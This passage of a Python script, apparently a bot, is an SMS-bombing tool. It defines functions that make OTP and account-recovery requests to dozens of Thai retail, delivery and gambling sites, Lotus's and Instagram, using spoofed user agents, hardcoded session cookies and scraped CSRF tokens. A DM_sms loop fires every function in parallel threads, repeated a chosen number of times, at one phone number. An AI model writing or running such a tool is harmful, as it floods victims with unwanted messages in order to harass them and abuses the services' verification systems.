	requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}")
	
def gx23(phone):
	SEND  = ru.Session()
	API_WEB = SEND.get('https://app.khonde.com/register',headers={"User-Agent": generate_user_agent()}).text
	SEND_TOKEN = bs(API_WEB,'html.parser')
	TOKEN = SEND_TOKEN.find("meta",attrs={"name":"csrf-token"})
	SMS = SEND.get(f'https://app.khonde.com/requestOTP/{phone}',headers={"X-XSRF-TOKEN": TOKEN['content'],"User-Agent": generate_user_agent(),"Cookie": "_gid=GA1.2.1429375693.1657960248; _gac_UA-74972330-26=1.1657960248.CjwKCAjww8mWBhABEiwAl6-2RVYe9XsjIIksM_BccLyzFFDX8T_YVTKKPOe2Q0BPyoTwjuzYwh6EyBoCN7wQAvD_BwE; _gat_gtag_UA_74972330_26=1; _fbp=fb.1.1657960248320.1708448457; _tt_enable_cookie=1; _ttp=da5ea560-0a16-4bc0-90d1-3ddd1fc73db4; XSRF-TOKEN=eyJpdiI6IisyMWw5ZnhaS2JXV3FmR3dyV0JGdVE9PSIsInZhbHVlIjoiQnNLQjh6dExTdmh5ZnJZeHNjNkkzd3dMMHpXV1dZV2hROXYyV0NMSnZpOWdQeFdqRU9RQ3Y4M2Y1aXk5Y1QvcFM1V2N0MG9oRUkxQUU3TlFESDlVU21Qa2JMMmxqRHBISFRsOXZGaFVMVGY0ZW1idysrWUVlNTFQWDYvQ1NSWFgiLCJtYWMiOiI1ODRiNTRmOGJkMzRjMzE1YmUxMmQ2Y2NkZWRhOGQ5ZDkwM2MxYWNjMmVmOTk2MzE4MmYzYmQ3ZWFiYWQ1ZjBlIn0%3D; khonde_session=eyJpdiI6IlMyNmpkRWl4NTh1emFLRWNiL0k2ZlE9PSIsInZhbHVlIjoiSEUzNGNnMVFwNGxJNTZVNmVzMWtrQk82NDZ0eGM1ckxrK3VVS1BWZ1NOMDlmbWl5RXdpa2dDMzQrdzIvMkRZeFpwa2dGamdGcFYwcVZWVjhFSjg2elZ1OUFxTWhuV3hIZlV2cFVIVW9VMnBCUEIxVUV6MVp1Y3JPb3JBOXFZeCsiLCJtYWMiOiJiYzM2ZDVhOWFiOTY3NTAyN2RhYTI1NWYwYjZhY2RmYTgxNWRmOGJkOWJhYjcyMGVhYzU0MjE4NGYxYjdlMTU4In0%3D; _ga_X6J1S6LV1V=GS1.1.1657960251.1.0.1657960251.60; _ga=GA1.1.1429094721.1657960248"})
	
def gx24(phone):
	requests.post("https://api.giztix.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},json={"operationName":"OtpGeneratePhone","variables":{"phone":f"66{phone[1:]}"},"query":"mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"})
	
def gx25(phone):
	requests.post("https://trainflix-api.xeersoft.co.th/api/otpphone/register",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/plain, */*","Content-Type": "application/json"},json={"numberphone": phone})
	
def gx26(phone):
	SEND  = Session()
	API_WEB = SEND.get('https://www.lalareed.com/register',headers={"user-agent": generate_user_agent()}).text
	SEND_TOKEN = bs(API_WEB,'html.parser')
	TOKEN = SEND_TOKEN.find("input",attrs={"name":"XSRF-TOKEN"})
	SESSION = SEND_TOKEN.find("input", attrs={"name":"laravel_session"})
	SMS = SEND.post("https://www.lalareed.com/api/register-otp",headers={"user-agent": generate_user_agent(),"x-xsrf-token": TOKEN['value'],"cookie": f"_gcl_au=1.1.1131468544.1666020802;_ga=GA1.2.150324224.1666020803;_gid=GA1.2.832210223.1666020803;_gat_gtag_UA_114046131_1=1;_gat_UA-114433633-1=1;G_ENABLED_IDPS=google;_fbp=fb.1.1666020805304.1453169846;XSRF-TOKEN={TOKEN}['value'];laravel_session={SESSION}['value']"},data=f"phone={phone}")
	
def gx27(phone):
	requests.post("https://dso.panggame.com/1/verify/send",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.1204499527.1666053101;_gcl_au=1.1.1227846426.1666053101;_fbp=fb.1.1666053101625.1278839242;_ga_2THGVDHQ7D=GS1.1.1666053101.1.1.1666053106.55.0.0;buttMsg=1666053125212"},json={"verify_source":1,"verify_type":1,"phone":f"{phone[1:]}","areacode":"66"})
	
def gx28(phone):
	requests.post("https://admin-api.24fix.tech/auth/otp/request",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},json={"phoneNumber":phone})
	
def gx29(phone):
	post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})
	
def gx30(phone):
	requests.post("https://kaspy.com/sms_63Vswc5dWk/sms.php/",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Cookie": "PHPSESSID=mvqfmd1daih60ep28gj9nrn04s; __atssc=google%3B1; __atuvc=2%7C42; __atuvs=634df68d89321b08001; private_content_version=93eb667db1caa66571dcb26591913a1e; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=fSk22U7uobzfYUUe; section_data_ids=%7B%22cart%22%3A1666053825%2C%22messages%22%3A1666053825%2C%22customer%22%3A1666053825%2C%22compare-products%22%3A1666053825%2C%22last-ordered-items%22%3A1666053825%2C%22directory-data%22%3A1666053825%2C%22captcha%22%3A1666053825%2C%22instant-purchase%22%3A1666053825%2C%22persistent%22%3A1666053825%2C%22review%22%3A1666053825%2C%22wishlist%22%3A1666053825%2C%22chatData%22%3A1666053816%2C%22recently_viewed_product%22%3A1666053825%2C%22recently_compared_product%22%3A1666053825%2C%22product_data_storage%22%3A1666053825%2C%22paypal-billing-agreement%22%3A1666053825%7D; _ga=GA1.2.1819946247.1666053827; _gid=GA1.2.2014825757.1666053827; _gat=1; mage-messages="},data=f"phoneVerifyFromSites={phone}")

def gx31(phone):
	requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"})
	
def gx32(phone):
	requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": generate_user_agent(),"accept": "application/json, text/plain, */*"},json={"phonenumber":phone,"language":"th"})
	
def gx33(phone):
	requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"})

def gx34(phone):
	requests.post("https://www.msport1688.com/auth/otp_sender",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "msp_ss_client=4a4nipncnp9l5ced7k5v7rrs9hdnscda;_ga=GA1.1.72563414.1657611524;_ga_1YLLB0C2FF=GS1.1.1657611524.1.1.1657611527.0"},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=")
	
def gx35(phone):
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	
def ig_token():
	d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
	d=search("csrftoken=(.*);",d).group(1).split(";")
	return d[0],d[10].replace(" Secure, ig_did=","")
def gx36(phone):
	token,_=ig_token()
	d=post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()

def gx37(phone):
	requests.post("https://davyjones.mrwed.cloud/customer/register/get-otp",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"countryCode":"TH","phoneNumber":phone})

def gx38(phone):
	requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"})

def gx39(phone):
	requests.post("https://m-api.hhh-st1.xyz/api/otp/register",headers={"content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"applicant":phone,"serviceName":"hihuay.com"})

def gx40(phone):
	requests.post("https://mapi.som777.com/api/otp/register",headers={"content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"applicant":f"+66{phone[1:]}","serviceName":"som777.com"})



	
def DM_sms(phone, jam):
	for x in range(int(jam)):
		threading.submit(gx1, phone)
		threading.submit(gx2, phone)
		threading.submit(gx3, phone)
		threading.submit(gx4, phone)
		threading.submit(gx5, phone)
		threading.submit(gx6, phone)
		threading.submit(gx7, phone)
		threading.submit(gx8, phone)
		threading.submit(gx9, phone)
		threading.submit(gx10, phone)
		threading.submit(gx11, phone)
		threading.submit(gx12, phone)
		threading.submit(gx13, phone)
		threading.submit(gx14, phone)
		threading.submit(gx15, phone)
		threading.submit(gx16, phone)
		threading.submit(gx17, phone)
		threading.submit(gx18, phone)
		threading.submit(gx19, phone)
		threading.submit(gx20, phone)
		threading.submit(gx21, phone)
		threading.submit(gx22, phone)
		threading.submit(gx23, phone)
		threading.submit(gx24, phone)
		threading.submit(gx25, phone)
		threading.submit(gx26, phone)
		threading.submit(gx27, phone)
		threading.submit(gx27, phone)
		threading.submit(gx29, phone)
		threading.submit(gx30, phone)
		threading.submit(gx31, phone)
		threading.submit(gx32, phone)
		threading.submit(gx33, phone)
		threading.submit(gx34, phone)
		threading.submit(gx35, phone)
		threading.submit(gx36, phone)
		threading.submit(gx37, phone)
		threading.submit(gx38, phone)
		threading.submit(gx39, phone)
		threading.submit(gx40, phone)
		



	

		
		
client.start()